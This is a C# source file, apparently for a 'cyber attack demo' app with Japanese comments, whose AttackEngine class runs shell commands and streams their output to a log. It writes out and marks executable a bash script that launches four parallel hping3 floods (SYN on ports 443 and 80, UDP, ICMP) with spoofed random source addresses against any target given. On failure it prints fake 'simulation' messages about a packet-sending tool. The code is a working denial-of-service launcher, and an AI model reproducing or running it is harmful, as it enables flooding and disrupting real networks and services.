using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading.Tasks;

namespace CyberAttackDemo
{
    public class AttackEngine
    {
        public event Action<string>? OnLogReceived;
        
        public const string AttackScriptName = @"./Attack/attack.sh";

        public async Task RunCommandAsync(string command, string args)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = command,
                    Arguments = args,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8, // 文字化け防止
                    StandardErrorEncoding = Encoding.UTF8
                };

                using var process = new Process { StartInfo = psi };

                // イベントハンドラで出力を受け取る（非同期）
                process.OutputDataReceived += (s, e) => 
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        string translated = LogTranslator.Translate(e.Data);
                        OnLogReceived?.Invoke(translated);
                    }
                };
                
                process.ErrorDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        OnLogReceived?.Invoke($"[STDERR] {e.Data}");
                    }
                };

                if (process.Start())
                {
                    // 非同期読み取りを開始
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    // プロセスの終了を非同期で待機（これが重要）
                    await process.WaitForExitAsync();
                }
            }
            catch (Exception ex)
            {
                OnLogReceived?.Invoke($"[ERROR] Command Execution Failed: {ex.Message}");
                
                await Task.Delay(1000);
                // デモ用フォールバック
                if (command.Contains("timeout") || args.Contains("NetSTRIK.py"))
                {
                     OnLogReceived?.Invoke("[SIMULATION] NetSTRIK is running in background...");
                     OnLogReceived?.Invoke("[SIMULATION] Sending packets...");
                }
                else
                {
                    OnLogReceived?.Invoke("Execution failed. Ensure tools are installed.");
                }
            }
        }

        public async Task EnsureAttackScriptExistsAsync()
        {
            try
            {
                string? dir = Path.GetDirectoryName(AttackScriptName);
                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                    OnLogReceived?.Invoke($"[SYSTEM] Created directory: {dir}");
                }

                if (!File.Exists(AttackScriptName))
                {
                    string scriptContent = @"#!/bin/bash
TARGET=${1:-""127.0.0.1""}
DURATION=${2:-""15""}

if [ ""$EUID"" -ne 0 ]; then 
  echo ""[!] WARNING: This script requires root privileges for hping3.""
fi

echo ""==========================================""
echo ""[*] TARGET: $TARGET""
echo ""[*] DURATION: ${DURATION}s""
echo ""==========================================""
echo ""[*] LAUNCHING 4 PARALLEL VECTORS...""

timeout ${DURATION}s hping3 -S -p 443 --flood --rand-source $TARGET > /dev/null 2>&1 &
PID1=$!
echo ""[+] Vector 1 (TCP/443) Fired (PID: $PID1)""

timeout ${DURATION}s hping3 -S -p 80 --flood --rand-source $TARGET > /dev/null 2>&1 &
PID2=$!
echo ""[+] Vector 2 (TCP/80)  Fired (PID: $PID2)""

timeout ${DURATION}s hping3 --udp --flood --rand-source $TARGET > /dev/null 2>&1 &
PID3=$!
echo ""[+] Vector 3 (UDP)     Fired (PID: $PID3)""

timeout ${DURATION}s hping3 -1 --flood -d 1200 --rand-source $TARGET > /dev/null 2>&1 &
PID4=$!
echo ""[+] Vector 4 (ICMP)    Fired (PID: $PID4)""

echo ""------------------------------------------""
echo ""[!] ALL GUNS BLAZING. HOLDING FIRE FOR ${DURATION}s...""
wait $PID1 $PID2 $PID3 $PID4
echo ""[*] CEASE FIRE. ATTACK COMPLETE.""
";
                    await File.WriteAllTextAsync(AttackScriptName, scriptContent);
                    try { Process.Start("chmod", $"+x {AttackScriptName}").WaitForExit(); } catch {}
                    OnLogReceived?.Invoke($"[SYSTEM] Generated attack script: {AttackScriptName}");
                }
            }
            catch (Exception ex)
            {
                OnLogReceived?.Invoke($"[ERROR] Failed to check/generate script: {ex.Message}");
            }
        }
    }
}
